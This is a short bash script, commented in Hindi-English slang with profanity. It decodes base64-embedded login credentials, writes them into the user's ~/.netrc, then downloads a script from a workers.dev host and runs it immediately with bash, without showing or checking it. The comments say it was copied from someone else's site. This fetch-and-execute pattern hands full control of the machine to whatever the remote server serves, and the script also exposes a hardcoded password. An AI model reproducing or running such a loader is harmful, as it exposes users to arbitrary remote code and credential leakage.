#!/usr/bin/env bash
# TERA NAYA CODE - JISHNU SITE KA COPY

set -euo pipefail

# --- Variables (tu chahe toh change kar) ---
URL="https://vpsmakersecurity.jishnudiscord7.workers.dev"
HOST="vpsmakersecurity.jishnudiscord7.workers.dev"
NETRC="${HOME}/.netrc"

# --- Base64 decode function ---
b64d() { printf '%s' "$1" | base64 -d; }

# --- Encoded credentials (original se copy) ---
USER_B64="amlzaG51"
PASS_B64="amlzaG51aEBja2VyMTIz"

USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

# --- Validation ---
if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
  echo "Credential decode failed." >&2
  exit 1
fi

# --- Check curl ---
if ! command -v curl >/dev/null 2>&1; then
  echo "Error: curl is required. Install kar pehle, chutiye." >&2
  exit 1
fi

# --- .netrc setup ---
touch "$NETRC"
chmod 600 "$NETRC"

tmpfile="$(mktemp)"
grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" 2>/dev/null || true
mv "$tmpfile" "$NETRC"

{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "$USER_RAW"
  printf 'password %s\n' "$PASS_RAW"
} >> "$NETRC"

# --- Download and execute ---
script_file="$(mktemp)"
cleanup() { rm -f "$script_file"; }
trap cleanup EXIT

if curl -fsS --netrc -o "$script_file" "$URL"; then
  echo "Download successful. Executing, madarchod..."
  bash "$script_file"
else
  echo "Authentication or download failed. Check your network or the server." >&2
  exit 1
fi
